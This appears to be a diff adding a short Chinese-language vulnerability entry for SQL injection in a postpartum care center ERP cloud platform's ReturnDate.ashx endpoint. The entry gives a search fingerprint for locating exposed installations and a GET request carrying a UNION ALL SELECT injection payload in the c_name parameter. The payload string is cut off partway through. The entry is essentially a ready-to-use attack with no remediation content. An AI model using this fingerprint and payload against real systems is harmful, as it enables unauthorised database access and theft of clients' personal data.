@@ -1,0 +1,6 @@
+# 月子会所ERP管理云平台ReturnDate.ashx存在SQL注入漏洞
+
+- **系统**：月子会所ERP管理云平台　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`body="月子护理ERP管理平台"`
+- **请求**：`GET /Page/NursingManager/ashx/ReturnDate.ashx?c_name=test%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2899%29%2BCHAR%2879%29%2BCHAR%28113%29%2BCHAR%2899%29%2BCH`
+- **预期**：200　|　—
